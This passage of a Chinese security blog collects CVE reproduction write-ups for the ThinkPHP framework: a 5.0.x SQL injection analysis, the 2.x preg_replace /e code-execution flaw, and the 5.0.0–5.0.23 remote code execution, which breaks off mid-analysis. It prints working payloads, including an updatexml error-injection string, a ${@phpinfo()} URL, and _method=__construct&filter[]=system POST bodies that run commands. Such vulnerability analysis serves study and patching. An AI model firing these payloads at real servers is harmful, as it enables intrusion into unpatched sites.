class="variable">$options</span>[<span class="string">&#x27;order&#x27;</span>], <span class="variable">$options</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseLimit(<span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseUnion(<span class="variable">$options</span>[<span class="string">&#x27;union&#x27;</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseLock(<span class="variable">$options</span>[<span class="string">&#x27;lock&#x27;</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseComment(<span class="variable">$options</span>[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseForce(<span class="variable">$options</span>[<span class="string">&#x27;force&#x27;</span>]),</span><br><span class="line">            ], <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sql</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个<code>$this-&gt;parseWhere($options[&#39;where&#39;], $options)</code>分支进入了关键的漏洞位置,此时<code>$where</code>可控</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseWhere</span>(<span class="params"><span class="variable">$where</span>, <span class="variable">$options</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$whereStr</span> = <span class="keyword">$this</span>-&gt;buildWhere(<span class="variable">$where</span>, <span class="variable">$options</span>);</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="variable">$whereStr</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="string">&#x27; WHERE &#x27;</span> . <span class="variable">$whereStr</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再跟进<code>$this-&gt;buildWhere($where, $options)</code>,此时<code>$where</code>可控</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildWhere</span>(<span class="params"><span class="variable">$where</span>, <span class="variable">$options</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$where</span>)) &#123;</span><br><span class="line">            <span class="variable">$where</span> = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$where</span> <span class="keyword">instanceof</span> Query) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;buildWhere(<span class="variable">$where</span>-&gt;getOptions(<span class="string">&#x27;where&#x27;</span>), <span class="variable">$options</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$whereStr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$binds</span>    = <span class="keyword">$this</span>-&gt;query-&gt;getFieldsBind(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$where</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="variable">$str</span> = [];</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$field</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                ...</span><br><span class="line">                    <span class="comment">// 对字段使用表达式查询</span></span><br><span class="line">                    <span class="variable">$field</span> = is_string(<span class="variable">$field</span>) ? <span class="variable">$field</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    <span class="variable">$str</span>[] = <span class="string">&#x27; &#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27; &#x27;</span> . <span class="keyword">$this</span>-&gt;parseWhereItem(<span class="variable">$field</span>, <span class="variable">$value</span>, <span class="variable">$key</span>, <span class="variable">$options</span>, <span class="variable">$binds</span>);</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$whereStr</span> .= <span class="keyword">empty</span>(<span class="variable">$whereStr</span>) ? substr(implode(<span class="string">&#x27; &#x27;</span>, <span class="variable">$str</span>), strlen(<span class="variable">$key</span>) + <span class="number">1</span>) : implode(<span class="string">&#x27; &#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$whereStr</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>$whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);</code>这个生成了sql语句的where部分,其中<code>$str</code>是由<code> $str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code>生成的,而参数<code>$value[1]</code>就是我们<code>ids[1,updatexml(0,concat(0x7e,(database()),0x7e),1)]=123%23</code>payload中的键值</p>
<p>跟进<code>$this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseWhereItem</span>(<span class="params"><span class="variable">$field</span>, <span class="variable">$val</span>, <span class="variable">$rule</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$options</span> = [], <span class="variable">$binds</span> = [], <span class="variable">$bindName</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	<span class="variable">$key</span> = <span class="variable">$field</span> ? <span class="keyword">$this</span>-&gt;parseKey(<span class="variable">$field</span>, <span class="variable">$options</span>) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查询规则和条件</span></span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$val</span>)) &#123;</span><br><span class="line">            <span class="variable">$val</span> = [<span class="string">&#x27;=&#x27;</span>, <span class="variable">$val</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$exp</span>, <span class="variable">$value</span>) = <span class="variable">$val</span>;</span><br><span class="line">        <span class="comment">// 字段分析</span></span><br><span class="line">        <span class="keyword">if</span>(....)&#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (in_array(<span class="variable">$exp</span>, [<span class="string">&#x27;NOT IN&#x27;</span>, <span class="string">&#x27;IN&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// IN 查询</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$value</span> <span class="keyword">instanceof</span> \<span class="built_in">Closure</span>) &#123;</span><br><span class="line">                <span class="variable">$whereStr</span> .= <span class="variable">$key</span> . <span class="string">&#x27; &#x27;</span> . <span class="variable">$exp</span> . <span class="string">&#x27; &#x27;</span> . <span class="keyword">$this</span>-&gt;parseClosure(<span class="variable">$value</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$value</span> = is_array(<span class="variable">$value</span>) ? <span class="variable">$value</span> : explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line">                <span class="keyword">if</span> (array_key_exists(<span class="variable">$field</span>, <span class="variable">$binds</span>)) &#123;</span><br><span class="line">                    <span class="variable">$bind</span>  = [];</span><br><span class="line">                    <span class="variable">$array</span> = [];</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$value</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;query-&gt;isBind(<span class="variable">$bindName</span> . <span class="string">&#x27;_in_&#x27;</span> . <span class="variable">$k</span>)) &#123;</span><br><span class="line">                            <span class="variable">$bindKey</span> = <span class="variable">$bindName</span> . <span class="string">&#x27;_in_&#x27;</span> . uniqid() . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$k</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="variable">$bindKey</span> = <span class="variable">$bindName</span> . <span class="string">&#x27;_in_&#x27;</span> . <span class="variable">$k</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$bind</span>[<span class="variable">$bindKey</span>] = [<span class="variable">$v</span>, <span class="variable">$bindType</span>];</span><br><span class="line">                        <span class="variable">$array</span>[]        = <span class="string">&#x27;:&#x27;</span> . <span class="variable">$bindKey</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;query-&gt;bind(<span class="variable">$bind</span>);</span><br><span class="line">                    <span class="variable">$zone</span> = implode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$array</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$zone</span> = implode(<span class="string">&#x27;,&#x27;</span>, <span class="keyword">$this</span>-&gt;parseValue(<span class="variable">$value</span>, <span class="variable">$field</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$whereStr</span> .= <span class="variable">$key</span> . <span class="string">&#x27; &#x27;</span> . <span class="variable">$exp</span> . <span class="string">&#x27; (&#x27;</span> . (<span class="keyword">empty</span>(<span class="variable">$zone</span>) ? <span class="string">&quot;&#x27;&#x27;&quot;</span> : <span class="variable">$zone</span>) . <span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$whereStr</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>然后我们可以看到当<code>in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])</code>条件满足时,将会直接将我们payload中的键值直接拼接到sql语句中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$value</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;query-&gt;isBind(<span class="variable">$bindName</span> . <span class="string">&#x27;_in_&#x27;</span> . <span class="variable">$k</span>)) &#123;</span><br><span class="line">                        <span class="variable">$bindKey</span> = <span class="variable">$bindName</span> . <span class="string">&#x27;_in_&#x27;</span> . uniqid() . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$k</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$bindKey</span> = <span class="variable">$bindName</span> . <span class="string">&#x27;_in_&#x27;</span> . <span class="variable">$k</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$bind</span>[<span class="variable">$bindKey</span>] = [<span class="variable">$v</span>, <span class="variable">$bindType</span>];</span><br><span class="line">                    <span class="variable">$array</span>[]        = <span class="string">&#x27;:&#x27;</span> . <span class="variable">$bindKey</span>;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>而<code>$exp</code>则由<code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code>中的<code>&#39;in&#39;</code>经过一系列操作后得到</p>
<p>但是这里只能进行没有子查询语句的sql报错注入</p>
<p>如果有子查询语句的话就会报<code>SQLSTATE[HY000]: General error: 1105 Only constant XPATH queries are supported</code>的错误</p>
<p>所以这个sql注入有点不行,但时sql报错会暴露数据库配置却是非常有用的</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html">https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html</a> </p>
<p> <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/01/31/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" data-id="cku8k8fxa002pd0ob8udj5wy4" data-title="ThinkPHP框架5.0.x_SQL注入分析" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ThinkPHP 2.x任意代码执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/01/29/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="2020-01-29T16:00:00.000Z" itemprop="datePublished">2020-01-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/01/29/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">ThinkPHP 2.x任意代码执行漏洞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP-2-x任意代码执行漏洞"><a href="#ThinkPHP-2-x任意代码执行漏洞" class="headerlink" title="ThinkPHP 2.x任意代码执行漏洞"></a>ThinkPHP 2.x任意代码执行漏洞</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>thinkphp 2.1</p>
<p>官网的thinkphp 2.2已经修复了</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞位置</p>
<p><img src="https://i.loli.net/2020/01/30/8UW5mxvARaoFlPX.png" alt="image154"></p>
<p>路由解析处</p>
<p><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode($depr,$paths));</code></p>
<p>这个preg_replace有点古怪,没有用<code>/</code>来包围搜索模式而是用<code>@</code>,查找关于preg的文档发现</p>
<blockquote>
<p>当使用 PCRE 函数的时候，模式需要由<em>分隔符</em>闭合包裹。分隔符可以使任意非字母数字、非反斜线、非空白字符。   </p>
<p> 经常使用的分隔符是正斜线(<em>/</em>)、hash符号(<em>#</em>)   以及取反符号(<em>~</em>)。下面的例子都是使用合法分隔符的模式。    </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;/foo bar/</span><br><span class="line">&gt;#^[^0-9]$#</span><br><span class="line">&gt;+php+</span><br><span class="line">&gt;%[a-zA-Z0-9_-]%</span><br></pre></td></tr></table></figure>
</blockquote>
<p>替换常量,这个就变成了</p>
<p><code>preg_replace(&#39;@(\w+)/([^\/\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode(&#39;/&#39;,$paths));</code></p>
<p>查看preg_replace的介绍发现</p>
<blockquote>
<p>当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：’、”、 \ 和 NULL) 然后进行后向引用替换。当这些完成后请确保后向引用解析完后没有单引号或双引号引起的语法错误(比如： ‘strlen(&#39;$1&#39;)+strlen(“$2”)’)。确保符合PHP的 字符串语法，并且符合eval语法。因为在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。 </p>
</blockquote>
<p>执行<code>$replacement</code>(第二个参数)前,会先替换掉引用</p>
<p>我们可以看到,<code>$replacement</code>用双引号来包围引用<code>\\2</code>,会导致命令执行</p>
<p>构造</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$paths</span>=<span class="keyword">array</span>(</span><br><span class="line">	<span class="string">&#x27;xxxx&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;$&#123;phpinfo()&#125;&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>则<code>&#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;</code>变为<code>$var[&#39;xxxx&#39;]=&quot;$&#123;phpinfo()&#125;&quot;;</code></p>
<p>从而导致命令执行</p>
<p>于是构造payload</p>
<p><code>[http://127.0.0.1/public/index.php?s=/index/index/name/$%7B@phpinfo()%7D](http://127.0.0.1/public/index.php?s=/index/index/name/$&#123;@phpinfo()&#125;)</code></p>
<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p><img src="https://i.loli.net/2020/01/30/9AlHbyKzaBOJXnR.png" alt="image1293"></p>
<p>用单引号来包围所有引用就可以避免命令执行</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce">https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/01/29/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cku8k8fx5002ad0ob919lhq45" data-title="ThinkPHP 2.x任意代码执行漏洞" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/01/29/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="2020-01-29T16:00:00.000Z" itemprop="datePublished">2020-01-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/01/29/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP-5-0-0-5-0-23-RCE-漏洞复现"><a href="#ThinkPHP-5-0-0-5-0-23-RCE-漏洞复现" class="headerlink" title="ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现"></a>ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> ThinkPHP 5.0.0~5.0.23 </p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">post_ex1：_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br><span class="line">post_exp2：_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure>





<h2 id="过程复现-exp1"><a href="#过程复现-exp1" class="headerlink" title="过程复现(exp1)"></a>过程复现(exp1)</h2><p> 以 thinkphp 5.0.22 完整版为复现环境(为啥要完整版等会说)，下载地址：<a target="_blank" rel="noopener" href="http://www.thinkphp.cn/down/1260.html">http://www.thinkphp.cn/down/1260.html</a> </p>
<p> 官方补丁地址：<a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a> </p>
<p><img src="https://i.loli.net/2020/01/30/LohuXMViDeg9AxT.png" alt="image562"></p>
<p>其中<code>$this-&gt;&#123;$this-&gt;method&#125;($_POST);</code>可以执行任意接受一个数组的request方法,<code>$this-&gt;method</code>可以通过控制<code>$_POST[&#39;_method&#39;]</code>来控制</p>
<p>查找相关方法后选定<code>__construct</code>来修改request属性再结合其他方法形成利用链</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$options</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$item</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (property_exists(<span class="keyword">$this</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$item</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;filter)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter = Config::get(<span class="string">&#x27;default_filter&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存 php://input</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;input = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>查找request中可能命令执行的方法时发现,input()方法可以通过修改filter来达到任意命令执行的效果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析过滤器</span></span><br><span class="line">        <span class="variable">$filter</span> = <span class="keyword">$this</span>-&gt;getFilter(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            array_walk_recursive(<span class="variable">$data</span>, [<span class="keyword">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);<span class="comment">//命令执行</span></span><br><span class="line">            reset(<span class="variable">$data</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filterValue(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/01/30/Fp5XRUNjlxABPWt.png" alt="image1678"></p>
<p>接着查找调用method()的地方,下断点</p>
<p><img src="https://i.loli.net/2020/01/30/F6ZvjtxGdP7uiKa.png" alt="image1768"></p>
<p>从入口点App.php开始查看可能作为攻击链一部分的地方</p>
<p>节选App.php关键内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params">Request <span class="variable">$request</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$request</span> = is_null(<span class="variable">$request</span>) ? Request::instance() : <span class="variable">$request</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ...</span><br><span class="line">            <span class="comment">// 获取应用调度信息</span></span><br><span class="line">            <span class="variable">$dispatch</span> = <span class="built_in">self</span>::<span class="variable">$dispatch</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 未设置调度信息则进行 URL 路由检测</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$dispatch</span>)) &#123;</span><br><span class="line">                <span class="variable">$dispatch</span> = <span class="built_in">self</span>::routeCheck(<span class="variable">$request</span>, <span class="variable">$config</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 记录当前调度信息</span></span><br><span class="line">            <span class="variable">$request</span>-&gt;dispatch(<span class="variable">$dispatch</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 记录路由和请求信息</span></span><br><span class="line">            ...</span><br><span class="line">            <span class="variable">$data</span> = <span class="built_in">self</span>::exec(<span class="variable">$dispatch</span>, <span class="variable">$config</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (HttpResponseException <span class="variable">$exception</span>) &#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$exception</span>-&gt;getResponse();</span><br><span class="line">        &#125;</span><br><span class="line">		...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进routeCheck</p>
